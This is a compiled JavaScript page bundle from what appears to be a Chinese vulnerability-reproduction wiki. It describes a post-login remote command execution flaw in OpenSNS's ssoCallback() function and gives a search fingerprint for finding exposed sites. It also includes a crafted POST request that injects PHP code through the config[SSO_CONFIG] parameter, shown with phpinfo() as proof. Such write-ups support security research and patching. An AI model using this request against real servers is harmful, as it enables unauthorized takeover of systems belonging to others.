(window.webpackJsonp=window.webpackJsonp||[]).push([[87],{1061:function(t,s,a){t.exports=a.p+"assets/img/1634371874190-3653480e-380a-4cdc-81fc-7d560bc7d0dc-20220313235551772.af5bef0e.png"},1062:function(t,s,a){t.exports=a.p+"assets/img/1634375559893-600bdee5-03fe-4da2-8762-c41ded4f3797.65155533.png"},1063:function(t,s,a){t.exports=a.p+"assets/img/1634376077943-1f4ae612-7dc6-44a8-963d-0235ce16d1fd.c62be73c.png"},1064:function(t,s,a){t.exports=a.p+"assets/img/1634376114084-4e3cf1c1-1a1b-4169-bf65-322e2002a947.86ee3e23.png"},2382:function(t,s,a){"use strict";a.r(s);var e=a(75),r=Object(e.a)({},(function(){var t=this,s=t.$createElement,e=t._self._c||s;return e("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[e("h1",{attrs:{id:"opensns-authorizecontroller-class-php-后台远程命令执行漏洞"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#opensns-authorizecontroller-class-php-后台远程命令执行漏洞"}},[t._v("#")]),t._v(" OpenSNS AuthorizeController.class.php 后台远程命令执行漏洞")]),t._v(" "),e("h2",{attrs:{id:"漏洞描述"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),e("p",[t._v("OpenSNS AuthorizeController.class.php文件 ssoCallback() 函数存在命令执行漏洞，在登录的情况下可以获取服务器权限")]),t._v(" "),e("h2",{attrs:{id:"漏洞影响"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v("OpenSNS")]),e("br"),t._v(" "),e("h2",{attrs:{id:"网络测绘"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),e("a-checkbox",{attrs:{checked:""}},[t._v('icon_hash="1167011145"')]),e("br"),t._v(" "),e("h2",{attrs:{id:"漏洞复现"}},[e("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),e("p",[t._v("登录页面如下")]),t._v(" "),e("p",[e("img",{attrs:{src:a(1061),alt:"img"}})]),t._v(" "),e("p",[t._v("存在漏洞的文件为 "),e("code",[t._v("Application/Admin/Controller/AuthorizeController.class.php")])]),t._v(" "),e("p",[e("img",{attrs:{src:a(1062),alt:"img"}})]),t._v(" "),e("p",[t._v("其中 config参数可控，构造请求就可以通过 file_put_contents 写入执行任意命令")]),t._v(" "),e("p",[e("img",{attrs:{src:a(1063),alt:"img"}})]),t._v(" "),e("p",[t._v("构造请求包")]),t._v(" "),e("div",{staticClass:"language-php line-numbers-mode"},[e("pre",{pre:!0,attrs:{class:"language-php"}},[e("code",[e("span",{pre:!0,attrs:{class:"token constant"}},[t._v("POST")]),t._v(" "),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("admin"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v(".")]),t._v("php"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("?")]),t._v("s"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("Authorize"),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("/")]),t._v("ssoCallback\\\n\nconfig"),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("[")]),e("span",{pre:!0,attrs:{class:"token constant"}},[t._v("SSO_CONFIG")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("]")]),e("span",{pre:!0,attrs:{class:"token operator"}},[t._v("=")]),e("span",{pre:!0,attrs:{class:"token function"}},[t._v("phpinfo")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("(")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(")")]),e("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(";")]),t._v("\n")])]),t._v(" "),e("div",{staticClass:"line-numbers-wrapper"},[e("span",{staticClass:"line-number"},[t._v("1")]),e("br"),e("span",{staticClass:"line-number"},[t._v("2")]),e("br"),e("span",{staticClass:"line-number"},[t._v("3")]),e("br")])]),e("p",[e("img",{attrs:{src:a(1064),alt:"img"}})])],1)}),[],!1,null,null,null);s.default=r.exports}}]);